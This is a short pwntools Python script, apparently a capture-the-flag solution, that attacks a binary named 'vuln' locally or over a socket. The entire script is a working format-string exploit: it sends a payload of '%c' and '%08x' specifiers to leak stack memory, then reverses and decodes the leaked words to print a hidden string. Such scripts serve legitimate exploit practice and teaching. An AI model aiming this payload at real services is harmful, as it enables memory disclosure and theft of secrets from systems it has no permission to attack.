#!/bin/python3
from pwn import *

##################
# PWNTOOLS SETUP #
##################
context.terminal = "kitty"
# context.terminal = 'wt.exe wsl -d Ubuntu'.split()

binary = context.binary = ELF("./vuln")

host = args.HOST or "localhost"
port = int(args.PORT or 25565)

if args.LOCAL:
    if args.GDBSCRIPT:
        io: tube = gdb.debug(binary.path, gdbscript=args.GDBSCRIPT)
    else:
        io: tube = process(binary.path)
else:
    io: tube = remote(host, port)

###########
# EXPLOIT #
###########
payload = b"%c"*35 + b"0w0" + b"|".join((b"%08x" for _ in range(16)))
io.sendline(payload)

io.recvuntil(b"0w0")
data = io.recvline().strip().decode()

segments = "".join(map(lambda x: bytes.fromhex(x)[::-1].decode("UTF-8", "replace"), data.split("|")))
print(segments[:segments.find("\x00")])
